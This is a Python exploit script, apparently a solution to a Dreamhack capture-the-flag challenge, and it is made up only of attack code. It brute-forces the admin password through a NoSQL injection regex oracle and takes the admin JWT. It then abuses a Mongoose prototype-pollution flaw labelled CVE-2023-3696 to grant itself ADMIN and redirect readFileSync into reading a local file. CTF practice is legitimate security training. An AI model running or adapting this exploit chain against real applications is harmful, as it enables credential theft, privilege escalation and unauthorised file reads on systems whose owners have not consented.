import requests
import string

url = 'http://host3.dreamhack.games:18235/'
s = requests.Session()

# nosqli oracle
admin_pw = ''

while len(admin_pw) < 32:
    for char in string.hexdigits[:16]:
        print("Trying:", char, '|', admin_pw)

        res = s.get(f'{url}/user/get?id=admin&password[__proto__][a]=a&password[$regex]=^{admin_pw + char}')

        if 'token' in res.text:
            admin_pw += char
            break

print("> Admin password:", admin_pw)

# get jwt token
assert 'token' in res.text

token = res.json()['token']
print("> Admin token:", token)

s.headers.update({
    'Authorization': f'Bearer {token}'
})

# CVE-2023-3696
def pollute(prop, value):
    res = s.post(f'{url}/config', json={ prop: value })

    config_id = res.json()['_id']

    res = s.patch(f'{url}/config', json={
        'config': config_id,
        'field': [ [f"data.{prop}", f'__proto__.{prop}'] ]
    })

    # trigger mongoose hydration for proto pollution
    res = s.get(f'{url}/config')

    print(f'> Polluted: {prop} -> {value}')

# get admin access
pollute('role', 'ADMIN')

# hijack readFileSync()
pollute('href', 'a')
pollute('hostname', '')
pollute('pathname', './flag')
pollute('protocol', 'file:')

res = s.get(f'{url}/file', params={
    'password': admin_pw
})

print("Flag:", res.text)